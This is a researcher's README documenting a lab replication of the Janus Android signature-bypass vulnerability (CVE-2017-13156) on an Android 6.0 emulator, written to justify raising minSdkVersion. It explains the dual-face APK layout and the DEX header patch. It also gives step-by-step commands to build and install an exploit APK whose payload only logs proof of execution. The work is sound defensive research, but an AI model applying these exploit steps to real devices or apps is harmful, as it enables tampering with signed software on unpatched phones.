# Janus Vulnerability Replication (CVE-2017-13156) 🚨

> **Purpose** — Reproduce the Janus signature-bypass bug on an **Android 6.0** emulator to prove why bumping `minSdkVersion` (and therefore requiring newer, fully-patched devices) is a *critical* security control flagged by tools such as **MobSF**.

---

## 📚 Contents
1. [Background](#background)
2. [Dual-Face APK Layout](#dual-face-apk-layout)
3. [Attack Workflow](#attack-workflow)
4. [Payload Design](#payload-design)
5. [Step-by-Step Reproduction](#step-by-step-reproduction)
6. [Observed Results](#observed-results)
7. [Project Files](#project-files)
8. [Real-World Lessons](#real-world-lessons)
9. [Testing Notes](#testing-notes)
10. [Author](#author)

---

## Background

**Janus (CVE-2017-13156)** is a *signature verification bypass* that stems from two Android subsystems parsing the **same file differently**:

| Parser | Purpose | View of the File |
| ------ | ------- | ---------------- |
| **PackageManager** | Verifies APK and signatures | Treats APK as a **ZIP** archive |
| **ART Runtime** | Executes application code | Treats leading bytes as a **DEX** file |

When an attacker *prepends* a malicious DEX in front of a valid ZIP, PackageManager still validates the original signature, while ART happily loads and executes the rogue bytecode.

---

## Dual-Face APK Layout

```
┌─────────────────────────────────────────────────────────────┐
│                     🎭 JANUS APK STRUCTURE                  │
├─────────────────────────────────────────────────────────────┤
│ Offset 0x0000: 💀 MALICIOUS DEX FILE                        │ ← 🤖 ART Runtime
│ ├─ MainApplication.class override                           │   reads this
│ ├─ Static blocks (guaranteed execution)                     │
│ ├─ Any additional payload for visual confirmation           │
│ └─ Size: ~2,332 bytes                                       │
├─────────────────────────────────────────────────────────────┤
│ Offset 0x0914: ⚪ ZERO PADDING                              │
│ └─ Aligns DEX to 4096-byte boundary                         │
├─────────────────────────────────────────────────────────────┤
│ Offset 0x1000: 📦 ORIGINAL ZIP STRUCTURE                    │ ← 📋 PackageManager
│ ├─ Valid v1 signature (META-INF/)                           │   reads this
│ ├─ Original classes.dex (superseded by malicious)           │
│ ├─ AndroidManifest.xml                                      │
│ ├─ Resources, assets, native libraries                      │
│ └─ Size: ~24.7 MB total                                     │
└─────────────────────────────────────────────────────────────┘
```

---

## Attack Workflow

### Phase 1: Initial Attempts
- `make_janus.py` and `make_janus_multidex.py`
- Tried to embed a malicious DEX by simply appending to the ZIP.
- **Problem**: This approach creates valid ZIP entries but **fails to confuse the parsers**, as both ZIP and DEX remain separate.

### Phase 2: Structure Correction
- ✅ `make_janus_proper_old.py`
- Insight: *"The malicious DEX should be placed before ZIP headers."*
- Implemented:
  - DEX placed at offset `0`
  - ZIP structure moved to offset `4096`
  - Central Directory and EOCD updated for ZIP consistency
- Result: Valid dual-face APK — **but no code execution yet**

### Phase 3: Security Bypass
- ✅ `scam_android.py` — 💡 **My 4AM brilliant breakthrough**
- Android 6 performs **DEX file size validation**
- Solution: Modify the DEX header to **claim entire APK file size**
- Result: Android accepts the malicious DEX as valid → execution achieved ✅

---

## Payload Design

### Target Class – `MainApplication.java`

Why override it?

1. **Loads before any Activity.**
2. **Static blocks** run *immediately* when the class is referenced.
3. Hooks such as `attachBaseContext()` & `onCreate()` give multiple execution points.
4. Easy visual feedback via `Toast` / log messages.

---

## Step-by-Step Reproduction

### 1. Environment

| Requirement | Version |
| ----------- | ------- |
| Android SDK | Build-Tools **35.0.0** |
| Emulator    | **Android 6.0 (API 23)**, Security Patch **2016-09-06** |
| Host Tools  | Python 3 |


---

### 2. Craft the Malicious DEX

```bash
# a. Prepare directory structure
mkdir -p com/noexpoapp

# b. Drop exploit source
cp MainApplicationExploit.java com/noexpoapp/MainApplication.java

# c. Compile to DEX
mkdir temp_dex
$ANDROID_SDK_ROOT/build-tools/36.0.0/d8 --output temp_dex com/noexpoapp/MainApplication.class

# d. Rename & clean
mv temp_dex/classes.dex nuclear_mainapp.dex
rm -rf temp_dex
```

### 3. Build the Dual-Face APK
```bash
# Original signed APK → dual-face test APK
python3 make_janus_proper_old.py app-release23.apk \
                                nuclear_mainapp.dex \
                                janus-nuclear-test.apk
```

### 4. Bypass Size Validation
```bash
python3 scam_android.py janus-nuclear-test.apk \
                        janus-nuclear-final.apk
```

### 5. Verify Signature still passes
```bash
$ANDROID_SDK_ROOT/build-tools/35.0.0/apksigner verify --verbose janus-nuclear-final.apk
```

### 6. Deploy and Install
```bash
adb push janus-nuclear-final.apk /storage/emulated/0/Download/

# macOS / Linux
adb shell am start -a android.intent.action.VIEW \
                   -d file:///sdcard/Download/janus-nuclear-final.apk \
                   -t application/vnd.android.package-archive

# Windows (PowerShell / cmd)
adb shell am start ^
  -a android.intent.action.VIEW ^
  -d file:///sdcard/Download/janus-nuclear-final.apk ^
  -t application/vnd.android.package-archive
```

## Observed Results

**Signature Verification**: PackageManager accepted the APK as a legitimate update with valid signatures

**Malicious Code Execution**: ART Runtime loaded and executed the injected MainApplication payload

**Logcat Evidence**
```
08-05 20:16:27.961  3648  3648 I System.out: 🚨🚨🚨 JANUS STATIC BLOCK EXECUTED! 🚨🚨🚨
08-05 20:16:27.961  3648  3648 E JANUS   : 🚨🚨🚨 STATIC BLOCK: MainApplication class loaded! 🚨🚨🚨
08-05 20:16:27.961  3648  3648 E JANUS   : 🚨 CONSTRUCTOR: MainApplication() called! 🚨
08-05 20:16:27.961  3648  3648 E JANUS   : 🚨 ATTACH: attachBaseContext() called! 🚨
08-05 20:16:27.961  3648  3648 E JANUS   : 💥 JANUS NUCLEAR: MainApplication.attachBaseContext() - Android 6 TARGET!
08-05 20:16:27.972  3648  3648 E JANUS   : 🚨 Android 6.0 Application class completely hijacked! 🚨
```

## 📁 Project Files

| File                      | Purpose                                                      |
|---------------------------|--------------------------------------------------------------|
| **make_janus_proper_old.py** | Builds the dual-face (DEX + ZIP) structure                   |
| **scam_android.py**          | Patches DEX header length to bypass Android 6 checks        |
| **nuclear_mainapp.dex**      | Compiled malicious `MainApplication` override class         |
| **janus-nuclear-final.apk**  | Final signed, installable Janus exploit APK                 |
| **MainApplication.java**     | Acts as the malicious payload, overwriting the logic in actual classes.dex |

---

## 🧠 Real-World Lessons

1. [Enforcement of V2/V3 signature schemes](https://developer.android.com/about/versions/11/behavior-changes-11#minimum-signature-scheme) **(Android 11+) seal off this vulnerability** by signing the entire file, preventing dual-face tampering.
2. **MobSF was absolutely right** — lifting `minSdkVersion` is a valid and necessary control.
   _This validates MobSF's warning and **validates my control of raising the minSDK version to successfully mitigate this vulnerability as higher API levels have more security patches in place**._

---

## Testing Notes
- Initial testing failed on Android 7.0.0 (security-patched image)
- Downgraded to Android 6 (API 23) and rebuilt the victim app with:
    - Compatible SDK and Gradle versions
    - targetSDKVersion 27 to avoid V2 signature enforcement
- Compatibility issues with Expo modules forced rebuilding a minimal native app `./NoExpoApp`

---

## Author

Crafted by _Nicholas Tok_ with far too many COKE ZEROS and countless emulator boots while navigating the abyss that is Android vulnerability replication.

